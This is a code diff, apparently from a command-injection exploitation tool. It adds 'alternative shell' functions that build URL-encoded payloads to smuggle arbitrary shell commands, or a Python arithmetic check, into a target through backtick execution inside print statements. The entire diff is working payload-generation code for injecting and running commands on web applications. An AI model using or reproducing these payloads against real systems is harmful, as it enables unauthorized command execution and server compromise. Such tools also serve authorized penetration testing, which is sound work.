@@ -36,6 +36,28 @@ def decision(separator, TAG, randv1, randv2):
                 separator + "echo " + TAG + "" +
                 separator + "echo " + TAG + "`)%3B"
               )
+    
+  return payload
+
+"""
+__Warning__: The alternative shells are still experimental.
+"""
+def decision_alter_shell(separator, TAG, randv1, randv2):
+  python_payload = "python -c \"print str(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))\""
+  if separator == "":
+    payload = ("print(`echo " + TAG + "`." +
+                "`" + python_payload + "`." +
+                "`echo " + TAG + "`." +
+                "`echo " + TAG + "`)%3B" +
+                separator
+              )
+  else:
+    payload = ("print(`echo " + TAG + "" +
+                separator + python_payload  +
+                separator + "echo " + TAG + "" +
+                separator + "echo " + TAG + "`)%3B"
+              )
+    
   return payload
 
 """
@@ -49,7 +71,6 @@ def cmd_execution(separator, TAG, cmd):
                 "`echo " + TAG + "`." +
                 "`echo " + TAG + "`)%3B"
               )
-    
   else:
     payload = ("print(`echo '" + TAG + "'" + 
                 separator + "echo '" + TAG + "'" +
@@ -57,7 +78,27 @@ def cmd_execution(separator, TAG, cmd):
                 separator + "echo '" + TAG + "'" +
                 separator + "echo '" + TAG + "'`)%3B"
               )
-  
+
+  return payload
+
+"""
+__Warning__: The alternative shells are still experimental.
+"""
+def cmd_execution_alter_shell(separator, TAG, cmd):
+  if separator == "":
+    payload = ("print(`echo " + TAG + "`." + 
+                "`echo " + TAG + "`." +
+                "`" + cmd + "`." +
+                "`echo " + TAG + "`." +
+                "`echo " + TAG + "`)%3B"
+              )
+  else:
+    payload = ("print(`echo '" + TAG + "'" + 
+                separator + "echo '" + TAG + "'" +
+                separator + cmd  +
+                separator + "echo '" + TAG + "'" +
+                separator + "echo '" + TAG + "'`)%3B"
+              )
   return payload
 
 #eof
